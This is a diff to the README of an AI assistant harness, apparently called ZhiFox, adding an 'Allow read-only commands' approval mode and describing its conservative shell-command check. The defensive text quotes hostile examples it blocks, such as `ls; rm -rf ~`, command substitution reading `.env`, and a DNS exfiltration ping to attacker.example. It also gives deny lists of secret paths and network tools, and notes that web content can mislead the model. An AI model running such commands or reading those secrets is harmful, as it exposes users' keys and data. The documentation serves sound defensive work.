@@ -97,7 +97,9 @@ computer, and you can reopen it from the sidebar or search it by title and conte
   stateless protocol (2026-07-28) and the older handshake-based one; every call asks you first unless you mark that
   tool "don't ask", and servers already set up in Claude Desktop or Claude Code can be imported in one click.
 - 🛡️ **Permission prompts.** Every shell command and every file write waits for your approval, and when you deny one
-  you can tell the model why. Looser modes last only until the next restart, and `.env` is always off-limits.
+  you can tell the model why. A middle mode lets commands that only look (`ls`, `df -h`, `git status`, `journalctl`…)
+  run without asking while anything that could change something still asks; the check behind it is deliberately
+  conservative. Looser modes last only until the next restart, and `.env` is always off-limits.
 - 💾 **Local-first.** Conversations, memory, to-dos and settings are plain files on your disk. The web server listens
   on 127.0.0.1 only, and the page loads no external resources.
 - 🔎 **Search across past conversations**, by title and content, tolerant of typos and skipped characters, without a
@@ -254,6 +256,7 @@ Each part of the harness has its own file or directory:
 | Edit and regenerate | [harness/rewind.py](harness/rewind.py) | You mistype, or the answer misses. The last turn can be rewound and run again: where to rewind to, which steps may have changed something (those need a warning first), and getting the attachments back |
 | Conversation claims | [harness/claims.py](harness/claims.py) | One conversation can be open in the web page and in a chat app at once. A conversation is claimed for each turn, so two sides never write to it at the same time and overwrite each other's turn |
 | Permissions | [harness/permissions.py](harness/permissions.py) | A model can make mistakes or be misled. Risky actions need your approval |
+| Read-only commands | [harness/commands/](harness/commands/) | Asking before every `ls` is tiresome, allowing everything is dangerous. A conservative check decides whether a shell command only looks: a tiny lexer that refuses anything with shell meaning, per-program flag rules, and path checks for secrets; plus your own list of commands that don't ask (see [Read-only commands](#read-only-commands-and-why-the-check-is-conservative)) |
 | Interfaces | [harness/ui.py](harness/ui.py) (terminal), [harness/webui/](harness/webui/) (web) | Show you what is happening and pass your input to the loop |
 | Markdown in replies | [harness/webui/markdown.js](harness/webui/markdown.js) | Models answer in Markdown. A small hand-written renderer turns it into headings, lists, tables and code blocks while the reply streams, without ever treating model output as HTML |
 | Settings and pricing | [harness/settings.py](harness/settings.py), [harness/pricing.py](harness/pricing.py) | Remember the model you chose and the keys you entered; turn tokens into money |
@@ -687,8 +690,9 @@ each finished paragraph goes back to the chat; a command or file change first ar
    buttons on the last one. The same request appears on the web page (a bar at the top of the main area and a card in
    **Extensions → Channels**); whichever answer arrives first counts, and the chat message is edited to say who decided
    ("Allowed on the web page"). You can also just reply "allow" or "deny" (the only way on platforms without buttons);
-   typed answers count only once the request has actually reached the chat. In **Allow file edits** or **Allow everything** mode, each step taken
-   without asking is still reported in the chat ("Auto-allowed: run_command $ …").
+   typed answers count only once the request has actually reached the chat. In **Allow read-only commands**, **Allow file
+   edits** or **Allow everything** mode, each step taken without asking is still reported in the chat ("Allowed
+   automatically: $ …", or "Allowed automatically (read-only): $ df -h" for a read-only command).
 6. **A persona per chat.** `/new researcher` starts a conversation with the custom agent *researcher* as its persona,
    the same as starting one from the page (its prompt, only the tools it allows, its model if it names one).
 7. **Sending files back.** "Take a screenshot and show me" used to end with "I can't send images to Telegram": the
@@ -1301,10 +1305,10 @@ The tunables are in [harness/config.py](harness/config.py): `DESKTOP_MAX_EDGE` (
 | Adding or deleting a reminder | Runs directly (at the set time it only shows a reminder: no model call, no cost) |
 | Adding or deleting a task the assistant runs on its own | Asks you first, and shows the schedule and the instruction (it will spend money later, with nobody watching) |
 | Reading files in the working directory | Runs directly |
-| Reading files outside the working directory | Asks you first |
+| Reading files outside the working directory | Asks you first. In **Allow read-only commands** mode it runs directly, unless the path is `data/`, a key file or looks like it holds secrets |
 | Reading files in `data/` (saved conversations, settings) | Asks you first, even when `data/` is inside the working directory |
 | Creating or changing any file | Asks you first, and shows what will be written |
-| Running any shell command | Asks you first, and shows the full command |
+| Running any shell command | Asks you first, and shows the full command. In **Allow read-only commands** mode, a command ZhiFox can tell only looks runs directly (see [Read-only commands](#read-only-commands-and-why-the-check-is-conservative)) |
 | Web search | Runs directly (on Anthropic's servers, without touching your computer), with a cap on the number of searches |
 | Calling an MCP server's tool | Asks you first, and shows the arguments that will be sent, unless you set that tool (or the whole server) to don't ask |
 | Browser: reading a page, taking a screenshot, scrolling, switching tabs | Runs directly (in ZhiFox's own browser, which holds none of your logins) |
@@ -1359,14 +1363,16 @@ below the input box; in the terminal, use `/auto`:
 | Option | Terminal command | Effect |
 |---|---|---|
 | Ask every time (default) | `/auto ask` | Everything marked "Asks you first" above asks, every time |
+| Allow read-only commands | `/auto readonly` | Commands that only look (`ls`, `cat`, `grep`, `df`, `ps`, `git status`, `git log`, `systemctl status`, `journalctl`, `docker ps`…), your own commands that don't ask, and reading files outside the working directory no longer ask. Commands that could change something, file edits, reading `.env`, `data/` or places like `~/.ssh`, MCP, browser steps, sending files and computer use still ask |
 | Allow file edits | `/auto edits` | Creating and changing files in the working directory no longer asks. Running commands, reading or writing outside the working directory, reading `data/`, browser steps and computer use still ask |
 | Allow everything | `/auto all` | Nothing asks, except the browser steps marked "in every mode" above and every computer use step |
 
 This only changes whether ZhiFox asks. Steps that ran without asking are marked **Allowed automatically** on their tool card in
-the web UI, and noted as "(allowed automatically)" in the terminal. The choice isn't saved: every launch starts again at Ask
+the web UI, and noted as "(allowed automatically)" in the terminal; a read-only command says **Allowed automatically
+(read-only)**, one of your own commands **Allowed automatically (your command)**. The choice isn't saved: every launch starts again at Ask
 every time, so you can't turn it on and forget about it.
 
-Scheduled tasks don't follow this choice. Each agent task has its own setting with the same three options, chosen in the
+Scheduled tasks don't follow this choice. Each agent task has its own setting with the same four options, chosen in the
 task editor and saved with the task (it defaults to Ask every time). Loosening the chat when you're watching says nothing
 about a task that runs at 3 a.m. Tasks the assistant creates for you are always Ask every time, and its tool has no way
 to change that: only you can, in the page. Otherwise a model misled by a web page could set itself a task that runs any
@@ -1382,6 +1388,69 @@ and the commands it runs can't see those keys either.
 A risk to understand: the approval prompt is the only checkpoint between you and the model. Before approving a command,
 check what it does, especially right after the assistant has read a web page or an unfamiliar file, because that
 content may contain text designed to mislead the model.
+
+#### Read-only commands, and why the check is conservative
+
+**Allow read-only commands** exists for one situation: you look after a server from your phone ("how full is the disk?",
+"is nginx running?", "show me the last 50 lines of its log") and being asked before every `df -h` is tiresome, but
+**Allow everything** would let anything run unasked. In this mode, a command that only looks runs straight away and is
+marked **Allowed automatically (read-only)**; a command that could change something still asks, in the conversation, in
+the task, in the chat. It sits between Ask every time and Allow file edits because the worst it can do is let the model
+see something (and the places worth hiding are excluded, below), while file edits really change things. It does not
+include file edits, and Allow file edits does not include read-only commands: the two loosen different things.
+
+How ZhiFox decides ([harness/commands/](harness/commands/)), step by step:
+
+1. **Words** ([words.py](harness/commands/words.py)). The command is split the way bash would, but only the plainest
+   part of bash is understood: words, single quotes, double quotes without `$` or backticks, backslash escapes, a `~` at
+   the start of a word, and `|` between stages. Anything else (`;`, `&&`, `||`, `&`, `>`, `<`, `$(…)`, `` ` ``, `$VAR`,
+   `*`, `?`, `[`, `{`, `NAME=value` in front, comments, newlines, invisible characters such as zero-width spaces) means
+   "can't be read with certainty", and the command asks. Each of these makes what you see differ from what runs:
+   `cat "$(echo .env)"` reads `.env`, `ls; rm -rf ~` is two commands, `echo hi > notes.txt` overwrites a file.
+2. **Programs** ([rules.py](harness/commands/rules.py)). Only programs on a built-in list count, each with its own
+   rule about which options are fine: `find` without `-exec`, `-delete` or `-fprint`; `sed` without `-i`, and only a
+   script made of simple commands (no `w`, `r` or `e`); `awk` without `system`, `getline`, `>` or `|` anywhere in the
+   program; `sort` without `-o`; `git` only for `status`, `log`, `diff`, `show`, `branch` (listing) and a few more, with no
+   options before the subcommand (`git -c core.pager=…` can run anything); `journalctl` without `--vacuum…`; `docker
+   ps|logs|images`; `kubectl get|describe|logs`, never Secrets; `crontab -l` and nothing else. GNU tools accept
+   abbreviations (`sort --out=x` is `--output=x`), so a forbidden long option is forbidden in every abbreviation; BSD
+   tools on macOS stop reading options at the first file (`uniq a.txt -c` writes a file named `-c`), so a word that looks
+   like an option after a file counts as a file too. Shells and interpreters (`bash`, `python -c`), wrappers that run
+   anything (`sudo`, `xargs`, `nohup`), pagers (`less` can run commands) and `env`/`printenv` (environment variables
+   often hold keys) are never read-only. Neither is anything that touches the network (`curl`, `ping`, `dig`, `ssh`): a
+   read-only command that can reach the network can send out what another one just read, and even a domain name to
+   look up can carry data (`ping <secret>.attacker.example`).
+3. **Paths** ([paths.py](harness/commands/paths.py)). Every word is treated as a possible path (an option's value, the
+   part after `HEAD:` in `git show HEAD:.env` too), resolved through symlinks and compared case-insensitively, because
+   macOS treats `.ENV` as `.env`. Reading ZhiFox's key files, `data/`, or a place that looks like it holds secrets
+   (`~/.ssh`, `~/.aws`, `.env*`, `*.pem`, `id_rsa*`, `*credential*`, shell history, `.git/config`, `/proc/*/environ`, `/dev`)
+   asks, even with a plain `cat`. A command that reads a whole folder (`grep -r`, `rg`, `diff` of two folders) also asks
+   if the folder contains any of these, or a symlink to another folder, or is too big to look through
+   (`READONLY_SCAN_ENTRIES`); one that only lists names (`find`, `ls -R`, `du`, `tree`) asks if the folder contains `data/`.
+4. **Pipes.** `ps aux | grep nginx` counts only when every stage is read-only on its own.
+
+Why so strict? The two possible mistakes don't cost the same. Asking about a command that was harmless costs you one
+tap. Letting through a command that wasn't can cost a deleted folder or a key sent to a provider. So every unclear case
+goes to "ask", and the check never tries to guess what a clever command really does. The price is that some harmless
+commands still ask (`awk '$3 > 100'` contains `>`; `grep -r TODO .` in a project that contains `.env`); the
+[test table](tests/test_commands.py) lists hundreds of commands both ways, including those costs and every bypass
+found while building it.
+
+**Your own commands that don't ask.** Commands you trust that aren't read-only (`npm test`, `make check`,
+`./scripts/status.sh`) can be added in **Settings → Commands that don't ask** (also linked from the approval dialog) or
+with `harness commands add "npm test"` / `list` / `remove`. An entry matches by its first words: `npm test` covers
+`npm test -- --watch` but not `npm testing`, so only add commands you're happy to run with anything after them. Entries
+go through the same word splitting (no `;`, `|`, `$(`…), programs that can run anything (`bash`, `sudo`, `env`, `xargs`,
+an interpreter without a script) can't be added, an entry never counts inside a pipe (`cat x | python …` would run
+whatever comes through the pipe), and the path checks still apply. The list lives in `data/commands.json` (mode 600),
+which the file tools can neither read nor change, like `.env` and `mcp.json`; the model has no tool that edits it.
+ZhiFox rereads the file when it changes, so `harness commands add` works while the server is running.
+
+Tunables are in `config.py`: `READONLY_MAX_CHARS` (2,000; longer commands always ask), `READONLY_SCAN_ENTRIES` (3,000),
+`MAX_ALLOWED_COMMANDS` (100), `MAX_ALLOWED_COMMAND_CHARS` (200) and `ALLOWED_COMMANDS_DEFAULT` (empty).
+Limits worth knowing: the secret-name list is a guess, so it only ever adds questions; a hard link to a file in `data/`
+made outside ZhiFox isn't recognised (one to a key file is); and this mode does let the model read files outside the
+working directory, which Ask every time and Allow file edits don't.
 
 ## Using ZhiFox
 
@@ -1616,8 +1685,8 @@ How agent tasks behave:
   in Settings at the moment it starts, and is saved as a normal conversation named after the task and the time (for
   example "Daily plan · 2026-11-21 09:00"). It appears in the sidebar marked as coming from a task, and you can open
   it, replay it, search it and keep chatting in it.
-- **Each task decides when to ask.** In the task editor, an agent task has the same three options as the chat's
-  approval setting: **Ask every time** (the default), **Allow file edits** and **Allow everything**, the last with a
+- **Each task decides when to ask.** In the task editor, an agent task has the same four options as the chat's
+  approval setting: **Ask every time** (the default), **Allow read-only commands**, **Allow file edits** and **Allow everything**, the last with a
   warning, since a task usually runs while nobody is watching. A row shows a small badge when its task is not Ask
   every time, and the task details show the setting. Anything that still needs approval pauses the run until you
   answer: the waiting approval is shown with the task, where you can allow or deny it, while you go on chatting.
@@ -1656,8 +1725,11 @@ Open **Extensions → Channels** and pick a platform. A four-step wizard walks y
 3. **Pair.** A 6-digit code appears with a countdown. Send it to your bot from your own account. On Telegram, **Open in
    Telegram** sends it for you when you press Start; on the others the button opens the chat with the bot. The page
    moves on by itself once you're paired.
-4. **Approval mode.** Ask every time (the default), Allow file edits, or Allow everything, for this channel only. Allow
-   everything comes with a warning: with it, one message in the chat can make the assistant run any command.
+4. **Approval mode.** Ask every time (the default), Allow read-only commands, Allow file edits, or Allow everything, for
+   this channel only. Allow read-only commands suits looking after a server from your phone: `df -h` or
+   `systemctl status nginx` runs at once, a restart still asks (see
+   [Read-only commands](#read-only-commands-and-why-the-check-is-conservative)). Allow everything comes with a warning:
+   with it, one message in the chat can make the assistant run any command.
 
 Setting up each platform (the wizard and `harness channels setup <platform>` print the same steps):
 
@@ -1810,7 +1882,7 @@ Allow? y to allow, Enter to deny, or type a reason to deny >
 | `/usage` | Show this run's token usage and estimated cost, plus what today and this month cost (and your monthly budget, if you set one) |
 | `/model` | Show the model in use (switch models in the web UI's Settings) |
 | `/mcp` | Show the connected MCP servers and their status (add and manage them in the web UI) |
-| `/auto` | Show or change when the assistant asks first: `/auto ask`, `/auto edits` or `/auto all` (see [Permissions](#permissions)) |
+| `/auto` | Show or change when the assistant asks first: `/auto ask`, `/auto readonly`, `/auto edits` or `/auto all` (see [Permissions](#permissions)) |
 | `/retry` | Regenerate the last answer: your message goes out again exactly as it was |
 | `/edit` | Edit your last message: it is filled into the input line for you to change; or type `/edit` followed by the new text. Like `/retry`, it asks first if that turn ran a command or changed a file |
 | `/exit` | Quit (`/quit` and Ctrl-D also work) |
@@ -1845,7 +1917,8 @@ uv sync
 echo 'ANTHROPIC_API_KEY=sk-ant-…' >> .env && chmod 600 .env    # or another provider's key
 uv run harness channels setup telegram     # paste the bot token (not echoed), or set TELEGRAM_BOT_TOKEN first
 uv run harness channels pair telegram      # prints a 6-digit code; send it to your bot, wait for "Paired"
-uv run harness channels approval telegram ask    # ask | edits | all (ask is the default)
+uv run harness channels approval telegram readonly    # ask | readonly | edits | all (ask is the default)
+uv run harness commands add "npm test"     # optional: your own commands that don't ask in readonly mode
 uv run harness channels status
 ```
 
@@ -1911,7 +1984,8 @@ journalctl -u zhifox -f        # logs; `-p warning` shows only warnings and erro
 
 The security model for remote ops: only the paired account is served (strangers get no reply, groups are ignored, a
 pairing code expires after 10 minutes or 5 wrong guesses); the default approval mode is **Ask every time**, and each
-approval shows the full command and the working folder before you tap Allow; **Allow everything** comes with a
+approval shows the full command and the working folder before you tap Allow; **Allow read-only commands** loosens only
+commands that just look; **Allow everything** comes with a
 warning and is a deliberate choice per channel; one turn at a time per chat, and `/stop` ends it, command included;
 the bot tokens and app secrets live only in `channels.json` (mode 600), are never sent to the browser or the model,
 are masked in exports and hidden in logs and error messages, and the assistant's file tool can't open that file in any
@@ -2158,7 +2232,7 @@ ends up in the zip), and their web endpoints in [tests/test_spending_web.py](tes
 tasks are covered in [tests/test_tasks.py](tests/test_tasks.py) (schedules, including month ends and daylight saving;
 storage; tools and their permissions) and [tests/test_task_runs.py](tests/test_task_runs.py) (runs through the real
 server with a fake clock, so no test waits for 9 a.m.: a run beside a chat turn, two runs side by side, the queue past
-the limit, Stop reaching only its own run, and the three approval modes; the fake API routes each run's requests by
+the limit, Stop reaching only its own run, and the four approval modes; the fake API routes each run's requests by
 its instruction, so parallel runs stay deterministic).
 MCP is tested against [tests/fake_mcp.py](tests/fake_mcp.py), a fake MCP server that speaks either protocol generation
 over stdio or HTTP, in [tests/test_mcp.py](tests/test_mcp.py) and [tests/test_mcp_web.py](tests/test_mcp_web.py).
@@ -2200,6 +2274,14 @@ shell and MCP calls, step and depth limits, spending recorded as `subagent`, the
 byte-identical; and personas saved and restored) and [tests/test_agents_web.py](tests/test_agents_web.py) (the
 `/api/agent/…` endpoints, starting a conversation with an agent, and the subagent events, confirmations and Stop in
 the web UI).
+The read-only check has a table of about nine hundred commands, each with the verdict it should get and why: quoting
+and escapes, every operator, option abbreviations and BSD late options, symlinks and hard links into protected
+places, case and Unicode variants, recursive commands over folders that hold secrets, and every bypass found while
+building it ([tests/test_commands.py](tests/test_commands.py)). The mode itself (what it lets through in a
+conversation, a scheduled task and a chat channel, the "why" on each auto-allowed step, your own list on the page and
+on the command line, and the model never reaching that list) is in [tests/test_readonly_mode.py](tests/test_readonly_mode.py),
+[tests/test_task_runs.py](tests/test_task_runs.py) and [tests/test_channels.py](tests/test_channels.py); the three
+selectors listing the same four modes, and the commands dialog, in [tests/ui/test_ui_approval_modes.py](tests/ui/test_ui_approval_modes.py).
 Browser use is tested in layers. The CDP client runs against in-process pipes, with a thread playing Chrome's end so a
 test can split a message into pieces or send an event before a reply ([tests/test_browser_cdp.py](tests/test_browser_cdp.py)).
 Launching (descriptors 3 and 4, no API keys in Chrome's environment, its own process group), closing the whole group,
